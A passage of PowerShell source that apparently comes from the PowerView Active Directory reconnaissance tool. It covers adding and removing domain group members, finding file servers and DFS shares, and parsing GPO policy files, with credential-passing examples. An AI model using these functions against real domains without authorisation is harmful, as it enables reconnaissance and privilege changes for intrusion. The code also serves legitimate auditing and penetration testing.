\"[Add-DomainGroupMember] Adding member '$Member' to group '$Identity'\"\n                $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)\n                $Group.Members.Add($Member)\n                $Group.Save()\n            }\n        }\n    }\n}\n\n\nfunction Remove-DomainGroupMember {\n<#\n.SYNOPSIS\n\nRemoves a domain user (or group) from an existing domain group, assuming\nappropriate permissions to do so.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-PrincipalContext  \n\n.DESCRIPTION\n\nFirst binds to the specified domain context using Get-PrincipalContext.\nThe bound domain context is then used to search for the specified -GroupIdentity,\nwhich returns a DirectoryServices.AccountManagement.GroupPrincipal object. For\neach entry in -Members, each member identity is similarly searched for and removed\nfrom the group.\n\n.PARAMETER Identity\n\nA group SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)\nspecifying the group to remove members from.\n\n.PARAMETER Members\n\nOne or more member identities, i.e. SamAccountName (e.g. Group1), DistinguishedName\n(e.g. CN=group1,CN=Users,DC=testlab,DC=local), SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114),\nor GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202).\n\n.PARAMETER Domain\n\nSpecifies the domain to use to search for user/group principals, defaults to the current domain.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nRemove-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y'\n\nRemoves harmj0y from 'Domain Admins' in the current domain.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nRemove-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred\n\nRemoves harmj0y from 'Domain Admins' in the current domain using the alternate credentials.\n\n.LINK\n\nhttp://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, Mandatory = $True)]\n        [Alias('GroupName', 'GroupIdentity')]\n        [String]\n        $Identity,\n\n        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]\n        [String[]]\n        $Members,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $ContextArguments = @{\n            'Identity' = $Identity\n        }\n        if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }\n\n        $GroupContext = Get-PrincipalContext @ContextArguments\n\n        if ($GroupContext) {\n            try {\n                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)\n            }\n            catch {\n                Write-Warning \"[Remove-DomainGroupMember] Error finding the group identity '$Identity' : $_\"\n            }\n        }\n    }\n\n    PROCESS {\n        if ($Group) {\n            ForEach ($Member in $Members) {\n                if ($Member -match '.+\\\\.+') {\n                    $ContextArguments['Identity'] = $Member\n                    $UserContext = Get-PrincipalContext @ContextArguments\n                    if ($UserContext) {\n                        $UserIdentity = $UserContext.Identity\n                    }\n                }\n                else {\n                    $UserContext = $GroupContext\n                    $UserIdentity = $Member\n                }\n                Write-Verbose \"[Remove-DomainGroupMember] Removing member '$Member' from group '$Identity'\"\n                $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)\n                $Group.Members.Remove($Member)\n                $Group.Save()\n            }\n        }\n    }\n}\n\n\nfunction Get-DomainFileServer {\n<#\n.SYNOPSIS\n\nReturns a list of servers likely functioning as file servers.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainSearcher  \n\n.DESCRIPTION\n\nReturns a list of likely fileservers by searching for all users in Active Directory\nwith non-null homedirectory, scriptpath, or profilepath fields, and extracting/uniquifying\nthe server names.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-DomainFileServer\n\nReturns active file servers for the current domain.\n\n.EXAMPLE\n\nGet-DomainFileServer -Domain testing.local\n\nReturns active file servers for the 'testing.local' domain.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainFileServer -Credential $Cred\n\n.OUTPUTS\n\nString\n\nOne or more strings representing file server names.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType([String])]\n    [CmdletBinding()]\n    Param(\n        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainName', 'Name')]\n        [String[]]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        function Split-Path {\n            # short internal helper to split UNC server paths\n            Param([String]$Path)\n\n            if ($Path -and ($Path.split('\\\\').Count -ge 3)) {\n                $Temp = $Path.split('\\\\')[2]\n                if ($Temp -and ($Temp -ne '')) {\n                    $Temp\n                }\n            }\n        }\n\n        $SearcherArguments = @{\n            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'\n            'Properties' = 'homedirectory,scriptpath,profilepath'\n        }\n        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n    }\n\n    PROCESS {\n        if ($PSBoundParameters['Domain']) {\n            ForEach ($TargetDomain in $Domain) {\n                $SearcherArguments['Domain'] = $TargetDomain\n                $UserSearcher = Get-DomainSearcher @SearcherArguments\n                # get all results w/o the pipeline and uniquify them (I know it's not pretty)\n                $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties['homedirectory']) {Split-Path($UserResult.Properties['homedirectory'])}if ($UserResult.Properties['scriptpath']) {Split-Path($UserResult.Properties['scriptpath'])}if ($UserResult.Properties['profilepath']) {Split-Path($UserResult.Properties['profilepath'])}}) | Sort-Object -Unique\n            }\n        }\n        else {\n            $UserSearcher = Get-DomainSearcher @SearcherArguments\n            $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties['homedirectory']) {Split-Path($UserResult.Properties['homedirectory'])}if ($UserResult.Properties['scriptpath']) {Split-Path($UserResult.Properties['scriptpath'])}if ($UserResult.Properties['profilepath']) {Split-Path($UserResult.Properties['profilepath'])}}) | Sort-Object -Unique\n        }\n    }\n}\n\n\nfunction Get-DomainDFSShare {\n<#\n.SYNOPSIS\n\nReturns a list of all fault-tolerant distributed file systems\nfor the current (or specified) domains.\n\nAuthor: Ben Campbell (@meatballs__)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainSearcher  \n\n.DESCRIPTION\n\nThis function searches for all distributed file systems (either version\n1, 2, or both depending on -Version X) by searching for domain objects\nmatching (objectClass=fTDfs) or (objectClass=msDFS-Linkv2), respectively\nThe server data is parsed appropriately and returned.\n\n.PARAMETER Domain\n\nSpecifies the domains to use for the query, defaults to the current domain.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-DomainDFSShare\n\nReturns all distributed file system shares for the current domain.\n\n.EXAMPLE\n\nGet-DomainDFSShare -Domain testlab.local\n\nReturns all distributed file system shares for the 'testlab.local' domain.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainDFSShare -Credential $Cred\n\n.OUTPUTS\n\nSystem.Management.Automation.PSCustomObject\n\nA custom PSObject describing the distributed file systems.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]\n    [OutputType('System.Management.Automation.PSCustomObject')]\n    [CmdletBinding()]\n    Param(\n        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainName', 'Name')]\n        [String[]]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [ValidateSet('All', 'V1', '1', 'V2', '2')]\n        [String]\n        $Version = 'All'\n    )\n\n    BEGIN {\n        $SearcherArguments = @{}\n        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n\n        function Parse-Pkt {\n            [CmdletBinding()]\n            Param(\n                [Byte[]]\n                $Pkt\n            )\n\n            $bin = $Pkt\n            $blob_version = [bitconverter]::ToUInt32($bin[0..3],0)\n            $blob_element_count = [bitconverter]::ToUInt32($bin[4..7],0)\n            $offset = 8\n            #https://msdn.microsoft.com/en-us/library/cc227147.aspx\n            $object_list = @()\n            for($i=1; $i -le $blob_element_count; $i++){\n                $blob_name_size_start = $offset\n                $blob_name_size_end = $offset + 1\n                $blob_name_size = [bitconverter]::ToUInt16($bin[$blob_name_size_start..$blob_name_size_end],0)\n\n                $blob_name_start = $blob_name_size_end + 1\n                $blob_name_end = $blob_name_start + $blob_name_size - 1\n                $blob_name = [System.Text.Encoding]::Unicode.GetString($bin[$blob_name_start..$blob_name_end])\n\n                $blob_data_size_start = $blob_name_end + 1\n                $blob_data_size_end = $blob_data_size_start + 3\n                $blob_data_size = [bitconverter]::ToUInt32($bin[$blob_data_size_start..$blob_data_size_end],0)\n\n                $blob_data_start = $blob_data_size_end + 1\n                $blob_data_end = $blob_data_start + $blob_data_size - 1\n                $blob_data = $bin[$blob_data_start..$blob_data_end]\n                switch -wildcard ($blob_name) {\n                    \"\\siteroot\" {  }\n                    \"\\domainroot*\" {\n                        # Parse DFSNamespaceRootOrLinkBlob object. Starts with variable length DFSRootOrLinkIDBlob which we parse first...\n                        # DFSRootOrLinkIDBlob\n                        $root_or_link_guid_start = 0\n                        $root_or_link_guid_end = 15\n                        $root_or_link_guid = [byte[]]$blob_data[$root_or_link_guid_start..$root_or_link_guid_end]\n                        $guid = New-Object Guid(,$root_or_link_guid) # should match $guid_str\n                        $prefix_size_start = $root_or_link_guid_end + 1\n                        $prefix_size_end = $prefix_size_start + 1\n                        $prefix_size = [bitconverter]::ToUInt16($blob_data[$prefix_size_start..$prefix_size_end],0)\n                        $prefix_start = $prefix_size_end + 1\n                        $prefix_end = $prefix_start + $prefix_size - 1\n                        $prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$prefix_start..$prefix_end])\n\n                        $short_prefix_size_start = $prefix_end + 1\n                        $short_prefix_size_end = $short_prefix_size_start + 1\n                        $short_prefix_size = [bitconverter]::ToUInt16($blob_data[$short_prefix_size_start..$short_prefix_size_end],0)\n                        $short_prefix_start = $short_prefix_size_end + 1\n                        $short_prefix_end = $short_prefix_start + $short_prefix_size - 1\n                        $short_prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$short_prefix_start..$short_prefix_end])\n\n                        $type_start = $short_prefix_end + 1\n                        $type_end = $type_start + 3\n                        $type = [bitconverter]::ToUInt32($blob_data[$type_start..$type_end],0)\n\n                        $state_start = $type_end + 1\n                        $state_end = $state_start + 3\n                        $state = [bitconverter]::ToUInt32($blob_data[$state_start..$state_end],0)\n\n                        $comment_size_start = $state_end + 1\n                        $comment_size_end = $comment_size_start + 1\n                        $comment_size = [bitconverter]::ToUInt16($blob_data[$comment_size_start..$comment_size_end],0)\n                        $comment_start = $comment_size_end + 1\n                        $comment_end = $comment_start + $comment_size - 1\n                        if ($comment_size -gt 0)  {\n                            $comment = [System.Text.Encoding]::Unicode.GetString($blob_data[$comment_start..$comment_end])\n                        }\n                        $prefix_timestamp_start = $comment_end + 1\n                        $prefix_timestamp_end = $prefix_timestamp_start + 7\n                        # https://msdn.microsoft.com/en-us/library/cc230324.aspx FILETIME\n                        $prefix_timestamp = $blob_data[$prefix_timestamp_start..$prefix_timestamp_end] #dword lowDateTime #dword highdatetime\n                        $state_timestamp_start = $prefix_timestamp_end + 1\n                        $state_timestamp_end = $state_timestamp_start + 7\n                        $state_timestamp = $blob_data[$state_timestamp_start..$state_timestamp_end]\n                        $comment_timestamp_start = $state_timestamp_end + 1\n                        $comment_timestamp_end = $comment_timestamp_start + 7\n                        $comment_timestamp = $blob_data[$comment_timestamp_start..$comment_timestamp_end]\n                        $version_start = $comment_timestamp_end  + 1\n                        $version_end = $version_start + 3\n                        $version = [bitconverter]::ToUInt32($blob_data[$version_start..$version_end],0)\n\n                        # Parse rest of DFSNamespaceRootOrLinkBlob here\n                        $dfs_targetlist_blob_size_start = $version_end + 1\n                        $dfs_targetlist_blob_size_end = $dfs_targetlist_blob_size_start + 3\n                        $dfs_targetlist_blob_size = [bitconverter]::ToUInt32($blob_data[$dfs_targetlist_blob_size_start..$dfs_targetlist_blob_size_end],0)\n\n                        $dfs_targetlist_blob_start = $dfs_targetlist_blob_size_end + 1\n                        $dfs_targetlist_blob_end = $dfs_targetlist_blob_start + $dfs_targetlist_blob_size - 1\n                        $dfs_targetlist_blob = $blob_data[$dfs_targetlist_blob_start..$dfs_targetlist_blob_end]\n                        $reserved_blob_size_start = $dfs_targetlist_blob_end + 1\n                        $reserved_blob_size_end = $reserved_blob_size_start + 3\n                        $reserved_blob_size = [bitconverter]::ToUInt32($blob_data[$reserved_blob_size_start..$reserved_blob_size_end],0)\n\n                        $reserved_blob_start = $reserved_blob_size_end + 1\n                        $reserved_blob_end = $reserved_blob_start + $reserved_blob_size - 1\n                        $reserved_blob = $blob_data[$reserved_blob_start..$reserved_blob_end]\n                        $referral_ttl_start = $reserved_blob_end + 1\n                        $referral_ttl_end = $referral_ttl_start + 3\n                        $referral_ttl = [bitconverter]::ToUInt32($blob_data[$referral_ttl_start..$referral_ttl_end],0)\n\n                        #Parse DFSTargetListBlob\n                        $target_count_start = 0\n                        $target_count_end = $target_count_start + 3\n                        $target_count = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_count_start..$target_count_end],0)\n                        $t_offset = $target_count_end + 1\n\n                        for($j=1; $j -le $target_count; $j++){\n                            $target_entry_size_start = $t_offset\n                            $target_entry_size_end = $target_entry_size_start + 3\n                            $target_entry_size = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_entry_size_start..$target_entry_size_end],0)\n                            $target_time_stamp_start = $target_entry_size_end + 1\n                            $target_time_stamp_end = $target_time_stamp_start + 7\n                            # FILETIME again or special if priority rank and priority class 0\n                            $target_time_stamp = $dfs_targetlist_blob[$target_time_stamp_start..$target_time_stamp_end]\n                            $target_state_start = $target_time_stamp_end + 1\n                            $target_state_end = $target_state_start + 3\n                            $target_state = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_state_start..$target_state_end],0)\n\n                            $target_type_start = $target_state_end + 1\n                            $target_type_end = $target_type_start + 3\n                            $target_type = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_type_start..$target_type_end],0)\n\n                            $server_name_size_start = $target_type_end + 1\n                            $server_name_size_end = $server_name_size_start + 1\n                            $server_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$server_name_size_start..$server_name_size_end],0)\n\n                            $server_name_start = $server_name_size_end + 1\n                            $server_name_end = $server_name_start + $server_name_size - 1\n                            $server_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$server_name_start..$server_name_end])\n\n                            $share_name_size_start = $server_name_end + 1\n                            $share_name_size_end = $share_name_size_start + 1\n                            $share_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$share_name_size_start..$share_name_size_end],0)\n                            $share_name_start = $share_name_size_end + 1\n                            $share_name_end = $share_name_start + $share_name_size - 1\n                            $share_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$share_name_start..$share_name_end])\n\n                            $target_list += \"\\\\$server_name\\$share_name\"\n                            $t_offset = $share_name_end + 1\n                        }\n                    }\n                }\n                $offset = $blob_data_end + 1\n                $dfs_pkt_properties = @{\n                    'Name' = $blob_name\n                    'Prefix' = $prefix\n                    'TargetList' = $target_list\n                }\n                $object_list += New-Object -TypeName PSObject -Property $dfs_pkt_properties\n                $prefix = $Null\n                $blob_name = $Null\n                $target_list = $Null\n            }\n\n            $servers = @()\n            $object_list | ForEach-Object {\n                if ($_.TargetList) {\n                    $_.TargetList | ForEach-Object {\n                        $servers += $_.split('\\')[2]\n                    }\n                }\n            }\n\n            $servers\n        }\n\n        function Get-DomainDFSShareV1 {\n            [CmdletBinding()]\n            Param(\n                [String]\n                $Domain,\n\n                [String]\n                $SearchBase,\n\n                [String]\n                $Server,\n\n                [String]\n                $SearchScope = 'Subtree',\n\n                [Int]\n                $ResultPageSize = 200,\n\n                [Int]\n                $ServerTimeLimit,\n\n                [Switch]\n                $Tombstone,\n\n                [Management.Automation.PSCredential]\n                [Management.Automation.CredentialAttribute()]\n                $Credential = [Management.Automation.PSCredential]::Empty\n            )\n\n            $DFSsearcher = Get-DomainSearcher @PSBoundParameters\n\n            if ($DFSsearcher) {\n                $DFSshares = @()\n                $DFSsearcher.filter = '(&(objectClass=fTDfs))'\n\n                try {\n                    $Results = $DFSSearcher.FindAll()\n                    $Results | Where-Object {$_} | ForEach-Object {\n                        $Properties = $_.Properties\n                        $RemoteNames = $Properties.remoteservername\n                        $Pkt = $Properties.pkt\n\n                        $DFSshares += $RemoteNames | ForEach-Object {\n                            try {\n                                if ( $_.Contains('\\') ) {\n                                    New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split('\\')[2]}\n                                }\n                            }\n                            catch {\n                                Write-Verbose \"[Get-DomainDFSShare] Get-DomainDFSShareV1 error in parsing DFS share : $_\"\n                            }\n                        }\n                    }\n                    if ($Results) {\n                        try { $Results.dispose() }\n                        catch {\n                            Write-Verbose \"[Get-DomainDFSShare] Get-DomainDFSShareV1 error disposing of the Results object: $_\"\n                        }\n                    }\n                    $DFSSearcher.dispose()\n\n                    if ($pkt -and $pkt[0]) {\n                        Parse-Pkt $pkt[0] | ForEach-Object {\n                            # If a folder doesn't have a redirection it will have a target like\n                            # \\\\null\\TestNameSpace\\folder\\.DFSFolderLink so we do actually want to match\n                            # on 'null' rather than $Null\n                            if ($_ -ne 'null') {\n                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_}\n                            }\n                        }\n                    }\n                }\n                catch {\n                    Write-Warning \"[Get-DomainDFSShare] Get-DomainDFSShareV1 error : $_\"\n                }\n                $DFSshares | Sort-Object -Unique -Property 'RemoteServerName'\n            }\n        }\n\n        function Get-DomainDFSShareV2 {\n            [CmdletBinding()]\n            Param(\n                [String]\n                $Domain,\n\n                [String]\n                $SearchBase,\n\n                [String]\n                $Server,\n\n                [String]\n                $SearchScope = 'Subtree',\n\n                [Int]\n                $ResultPageSize = 200,\n\n                [Int]\n                $ServerTimeLimit,\n\n                [Switch]\n                $Tombstone,\n\n                [Management.Automation.PSCredential]\n                [Management.Automation.CredentialAttribute()]\n                $Credential = [Management.Automation.PSCredential]::Empty\n            )\n\n            $DFSsearcher = Get-DomainSearcher @PSBoundParameters\n\n            if ($DFSsearcher) {\n                $DFSshares = @()\n                $DFSsearcher.filter = '(&(objectClass=msDFS-Linkv2))'\n                $Null = $DFSSearcher.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))\n\n                try {\n                    $Results = $DFSSearcher.FindAll()\n                    $Results | Where-Object {$_} | ForEach-Object {\n                        $Properties = $_.Properties\n                        $target_list = $Properties.'msdfs-targetlistv2'[0]\n                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])\n                        $DFSshares += $xml.targets.ChildNodes | ForEach-Object {\n                            try {\n                                $Target = $_.InnerText\n                                if ( $Target.Contains('\\') ) {\n                                    $DFSroot = $Target.split('\\')[3]\n                                    $ShareName = $Properties.'msdfs-linkpathv2'[0]\n                                    New-Object -TypeName PSObject -Property @{'Name'=\"$DFSroot$ShareName\";'RemoteServerName'=$Target.split('\\')[2]}\n                                }\n                            }\n                            catch {\n                                Write-Verbose \"[Get-DomainDFSShare] Get-DomainDFSShareV2 error in parsing target : $_\"\n                            }\n                        }\n                    }\n                    if ($Results) {\n                        try { $Results.dispose() }\n                        catch {\n                            Write-Verbose \"[Get-DomainDFSShare] Error disposing of the Results object: $_\"\n                        }\n                    }\n                    $DFSSearcher.dispose()\n                }\n                catch {\n                    Write-Warning \"[Get-DomainDFSShare] Get-DomainDFSShareV2 error : $_\"\n                }\n                $DFSshares | Sort-Object -Unique -Property 'RemoteServerName'\n            }\n        }\n    }\n\n    PROCESS {\n        $DFSshares = @()\n\n        if ($PSBoundParameters['Domain']) {\n            ForEach ($TargetDomain in $Domain) {\n                $SearcherArguments['Domain'] = $TargetDomain\n                if ($Version -match 'all|1') {\n                    $DFSshares += Get-DomainDFSShareV1 @SearcherArguments\n                }\n                if ($Version -match 'all|2') {\n                    $DFSshares += Get-DomainDFSShareV2 @SearcherArguments\n                }\n            }\n        }\n        else {\n            if ($Version -match 'all|1') {\n                $DFSshares += Get-DomainDFSShareV1 @SearcherArguments\n            }\n            if ($Version -match 'all|2') {\n                $DFSshares += Get-DomainDFSShareV2 @SearcherArguments\n            }\n        }\n\n        $DFSshares | Sort-Object -Property ('RemoteServerName','Name') -Unique\n    }\n}\n\n\n########################################################\n#\n# GPO related functions.\n#\n########################################################\n\nfunction Get-GptTmpl {\n<#\n.SYNOPSIS\n\nHelper to parse a GptTmpl.inf policy file path into a hashtable.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Add-RemoteConnection, Remove-RemoteConnection, Get-IniContent  \n\n.DESCRIPTION\n\nParses a GptTmpl.inf into a custom hashtable using Get-IniContent. If a\nGPO object is passed, GPOPATH\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf\nis constructed and assumed to be the parse target. If -Credential is passed,\nAdd-RemoteConnection is used to mount \\\\TARGET\\SYSVOL with the specified creds,\nthe files are parsed, and the connection is destroyed later with Remove-RemoteConnection.\n\n.PARAMETER GptTmplPath\n\nSpecifies the GptTmpl.inf file path name to parse.\n\n.PARAMETER OutputObject\n\nSwitch. Output a custom PSObject instead of a hashtable.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the remote system.\n\n.EXAMPLE\n\nGet-GptTmpl -GptTmplPath \"\\\\dev.testlab.local\\sysvol\\dev.testlab.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf\"\n\nParse the default domain policy .inf for dev.testlab.local\n\n.EXAMPLE\n\nGet-DomainGPO testing | Get-GptTmpl\n\nParse the GptTmpl.inf policy for the GPO with display name of 'testing'.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-GptTmpl -Credential $Cred -GptTmplPath \"\\\\dev.testlab.local\\sysvol\\dev.testlab.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf\"\n\nParse the default domain policy .inf for dev.testlab.local using alternate credentials.\n\n.OUTPUTS\n\nHashtable\n\nOuputs a hashtable representing the parsed GptTmpl.inf file.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType([Hashtable])]\n    [CmdletBinding()]\n    Param (\n        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('gpcfilesyspath', 'Path')]\n        [String]\n        $GptTmplPath,\n\n        [Switch]\n        $OutputObject,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $MappedPaths = @{}\n    }\n\n    PROCESS {\n        try {\n            if (($GptTmplPath -Match '\\\\\\\\.*\\\\.*') -and ($PSBoundParameters['Credential'])) {\n                $SysVolPath = \"\\\\$((New-Object System.Uri($GptTmplPath)).Host)\\SYSVOL\"\n                if (-not $MappedPaths[$SysVolPath]) {\n                    # map IPC$ to this computer if it's not already\n                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential\n                    $MappedPaths[$SysVolPath] = $True\n                }\n            }\n\n            $TargetGptTmplPath = $GptTmplPath\n            if (-not $TargetGptTmplPath.EndsWith('.inf')) {\n                $TargetGptTmplPath += '\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf'\n            }\n\n            Write-Verbose \"[Get-GptTmpl] Parsing GptTmplPath: $TargetGptTmplPath\"\n\n            if ($PSBoundParameters['OutputObject']) {\n                $Contents = Get-IniContent -Path 